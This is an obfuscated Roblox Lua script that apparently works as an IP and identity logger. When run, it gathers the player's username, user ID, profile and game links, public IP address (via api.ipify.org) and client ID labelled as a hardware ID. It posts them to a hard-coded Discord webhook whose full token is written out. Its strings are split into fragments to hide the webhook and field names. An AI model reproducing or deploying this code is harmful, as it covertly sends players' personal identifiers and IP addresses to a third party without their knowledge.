local _G_S=game:GetService
local _a=_G_S("HttpService")
local _b=_G_S("Players")
local _c=_G_S("RbxAnalyticsService")
local _d=_b.LocalPlayer
local _e="h".."tt".."ps://dis".."cord.c".."om/a".."pi/web".."hooks/13542".."32112001".."192190/VyBfc".."kVG2DoPa".."CXgZ6WYS".."CiPMpPmI".."SC7lVtz6g".."d3W6nb4J1".."GPBC4j6Pd".."AcYp90UWQeXk"

local function _f()
    local _s, _r = pcall(function()
        return game:HttpGet("h".."tt".."ps://a".."pi.ip".."ify.o".."rg")
    end)
    return _s and _r or "U".."nkn".."own"
end

local function _g()
    local _s, _r = pcall(function()
        return _c:GetClientId()
    end)
    return _s and _r or "U".."nkn".."own"
end

local function _h()
    local _data = {
        ["c".."on".."te".."nt"] = "",
        ["e".."mb".."ed".."s"] = {
            {
                ["t".."it".."le"] = "S".."cr".."ip".."t E".."xe".."cu".."te".."d",
                ["c".."ol".."or"] = 0xFF0000,
                ["f".."ie".."ld".."s"] = {
                    {["n".."am".."e"] = "U".."se".."rn".."am".."e", ["v".."al".."ue"] = _d and _d.Name or "U".."nk".."no".."wn", ["i".."nl".."in".."e"] = true},
                    {["n".."am".."e"] = "U".."se".."r I".."D", ["v".."al".."ue"] = _d and _d.UserId or "U".."nk".."no".."wn", ["i".."nl".."in".."e"] = true},
                    {["n".."am".."e"] = "P".."ro".."fi".."le", ["v".."al".."ue"] = _d and "h".."tt".."ps://w".."ww.ro".."bl".."ox.c".."om/u".."se".."rs/".._d.UserId.."/p".."ro".."fi".."le" or "U".."nk".."no".."wn", ["i".."nl".."in".."e"] = true},
                    {["n".."am".."e"] = "G".."am".."e", ["v".."al".."ue"] = game and game.PlaceId and "h".."tt".."ps://w".."ww.ro".."bl".."ox.c".."om/g".."am".."es/"..game.PlaceId or "U".."nk".."no".."wn", ["i".."nl".."in".."e"] = true},
                    {["n".."am".."e"] = "G".."am".."e N".."am".."e", ["v".."al".."ue"] = game and game.Name or "U".."nk".."no".."wn", ["i".."nl".."in".."e"] = true},
                    {["n".."am".."e"] = "I".."P A".."dd".."re".."ss", ["v".."al".."ue"] = _f(), ["i".."nl".."in".."e"] = true},
                    {["n".."am".."e"] = "H".."ar".."dw".."ar".."e I".."D", ["v".."al".."ue"] = _g(), ["i".."nl".."in".."e"] = true},
                    {["n".."am".."e"] = "E".."xe".."cu".."ti".."on T".."im".."e", ["v".."al".."ue"] = os.date("%Y-%m-%d %H:%M:%S"), ["i".."nl".."in".."e"] = true}
                },
                ["t".."im".."es".."ta".."mp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }
    
    pcall(function()
        _a:PostAsync(_e, _a:JSONEncode(_data), Enum.HttpContentType.ApplicationJson)
    end)
end

_h()
